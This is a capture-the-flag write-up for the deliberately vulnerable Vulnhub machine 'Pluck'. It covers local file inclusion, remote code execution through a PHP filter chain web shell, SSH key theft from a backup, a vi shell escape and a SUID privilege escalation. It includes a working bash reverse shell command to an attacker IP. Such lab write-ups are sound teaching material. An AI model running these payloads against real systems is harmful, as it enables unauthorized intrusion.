---
title: Vulnhub - Pluck.
categories: [Writeup, webExploitation, Linux]
tags: [LFI, Linux, easy]
description: In this Writeup we will face a Local File Inclusion exploitation and obtain a shell via RCE. Finally, we will make a latearl privilege escalation and a final privilege escalation exploiting a SUID binary.
---

Download vulnerable target machine: [Vulnhub: pluck: 1](https://www.vulnhub.com/entry/pluck-1,178/)

-------------------------

## Discovery.

### Port Scan.

The first step is allways to run a port scan and see which of them are opened in the target. I like to use nmap to do this task.
```bash
nmap -p- -Pn -sS --min-rate 5000 --open 192.168.1.115 -oN scan
```
![img-description](assets/img/writeups/2024/pluck/1.png)
_Ports scan._


The nmap scan showed four opened ports, port __22__ `ssh`, __80__ `http`, __3306__ `mysql`, __5355__ `llmnr`.
After obtainig the open ports from the target we can proceed to make a version scan.
```bash
nmap -p22,80 -sVC -Pn 192.168.1.39 -oN versions
```
![img-description](assets/img/writeups/2024/pluck/2.3.png)
_nmap version scan._


### Manual web enumeration.
We saw in the port scan that port 80 is open and hosting `http`. Let's open the browser and perform a manual enumeration of the target web server:

![img-description](assets/img/writeups/2024/pluck/2.png)

We can see there is an admin login, I tried to make an SQL authentication bypass and I could see the SQL syntax error. But after trying different payloads I couldn't become the admin user. 

![img-description](assets/img/writeups/2024/pluck/3.png)

After that attempt i had to find another attack vector so I started analyzing the URL, where I could see the followind URL deploying `contact.php` which is very suspicious.

![img-description](assets/img/writeups/2024/pluck/2.5.png)


## Exploitation
### Local File Inclusion
>You can visit my GitHub profile to see and study all the techniques we are going to use from now on. [Github - Local File Inclusion.](https://github.com/PentesterArchive/Hacking-Web/tree/main/Local%20File%20Inclusion-Path%20traversal)
{: .prompt-info }

#### Detection

After finding the suspicious URL I tried to perform a `LFI` attack trying to visualize the `/etc/passwd` file from the target.

![img-description](assets/img/writeups/2024/pluck/4.png)
![img-description](assets/img/writeups/2024/pluck/5.png)
> We can see an interesting user `backup-user` and the directory `backup.sh` in the /etc/passwd. We will need this information in the future.

The file `/etc/passwd` it's shown, which means that __the Local File Inclusion was succesful__.

![img-description](assets/img/writeups/2024/pluck/6.png)

Now with the data we achieved in the `/etc/passwd` we can try to make a __brute force attack in the admin login panel__, instead of that I prefered to _continue with the __`LFI` attack trying to obtain a `Remote Code Execution`__._

#### LFI to RCE
First I tried to make a `Log Poisoning attack` but i couldn't find any log file so I couldn't make the attack. 
After that, I tried to obtain the `RCE` using the `LFI PHP Filter Chain Attack`. To execute this attack easily, I like to use the [php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator/tree/main) tool, so I don't have to generate the payload myself.


![img-description](assets/img/writeups/2024/pluck/9.png)


```bash
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"])?>'
```

![img-description](assets/img/writeups/2024/pluck/10.png)

After obtaining the output from `php_filter_chain_generator.py` we can copy it in the vulnerable `LFI` (page=). Once it's done, we can execute any command using `&cmd=<command>`. <br />
`&cmd=id`:
![img-description](assets/img/writeups/2024/pluck/10.5.png)


In my case I prefer to obtain a __shell__ rather than execute the commands on the browser, so I decided to listen on my local machine using `nc` and paste the next command.

```bash
bash -c "bash -i >& /dev/tcp/<ip>/<Port> 0>&1"
```
__The command must be url-encoded:__ 
```bash
bash -c "bash -i >%26 %2Fdev%2Ftcp%2F192.168.1.54%2F443 0>%261"
```

![img-description](assets/img/writeups/2024/pluck/11.png)

![img-description](assets/img/writeups/2024/pluck/12.png)

As we can see we succeed obtaining the shell.

---------------------------

## Privilege Escalation.
### Lateral Privilege escalation. SSH keys lekeage.
Once obtained a Reverse Shell it's time to elevate our privileges. I remembered the `backup.sh` we found in the `/etc/passwd` file and now it's a good moment to try to read it's content.<br />
Let's check the directory of the `backup.sh` again:
![img-description](assets/img/writeups/2024/pluck/16.png)


![img-description](assets/img/writeups/2024/pluck/17.png)
![img-description](assets/img/writeups/2024/pluck/17.5.png)
_reading backup.sh_

We can see that we can get backup.tar via `tftp`. Let's do it:


![img-description](assets/img/writeups/2024/pluck/18.png)

Decompress .tar:
```bash
tar -xvf backup.tar
```

We see  2 directories, `home` and `var`. We can use the command `tree` to see recursively all the files and directories contained inside.
![img-description](assets/img/writeups/2024/pluck/19.png)
![img-description](assets/img/writeups/2024/pluck/20.png)


We can see that we have some `ssh` keys for the user paul. Let's try to use them one by one and see if we can perform a lateral privilege escalation to Paul.

![img-description](assets/img/writeups/2024/pluck/21.png)
![img-description](assets/img/writeups/2024/pluck/22.png)

We access the following 'menu' using `id_key4`.


![img-description](assets/img/writeups/2024/pluck/23.png)
_pdmenu_

Checking the `pdmenu` functionalities I see that we can use `vi` in "Edit file", if we can use vi, we can obtain a shell too.<br />
We can see how to obtain shells using vi in [gtfobins - /vi/shell](https://gtfobins.github.io/gtfobins/vi/#shell).
```bash
:set shell=/bin/sh
:shell
```

![img-description](assets/img/writeups/2024/pluck/23.5.png)
_We have a shell as paul user._


### Privilege Escalation; SUID binaries.
Finding SUID binaries I saw the next suspicious binary.
```bash
find / -perm -4000 2>/dev/null
```


![img-description](assets/img/writeups/2024/pluck/28.png)

As we have the binary name and version I used searchsploit to try to find a PE exploit:
![img-description](assets/img/writeups/2024/pluck/31.png)

We must transfer the exploit to the target system.
![img-description](assets/img/writeups/2024/pluck/29.png)

Finally, we just need to run the exploit to gain access to the root user.<br />
![img-description](assets/img/writeups/2024/pluck/30.png)





----------------------
-------------



